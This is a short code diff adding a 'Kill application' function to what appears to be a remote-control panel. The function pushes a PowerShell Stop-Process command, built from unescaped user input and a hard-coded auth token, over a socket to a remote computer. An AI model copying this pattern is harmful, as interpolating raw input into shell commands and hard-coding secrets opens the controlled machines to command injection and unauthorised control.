@@ -403,6 +403,22 @@ export default {
           }
         },
         {
+          functionName: "Kill application",
+          requiresInput: true,
+          placeHolder: "chrome",
+          enabled: true,
+          function(vm, NAME) {
+            let shellCommand = `Stop-Process -Name "${NAME}" -force`;
+
+            return vm.socketData.CurrentSocket.emit("transmitToClients", {
+              auth: "B3GHU8",
+              computerName: vm.socketData.computerName,
+              functionName: this.functionName,
+              shellCommand: shellCommand
+            });
+          }
+        },
+        {
           functionName: "Set profile picture",
           requiresInput: true,
           placeHolder: "URL",
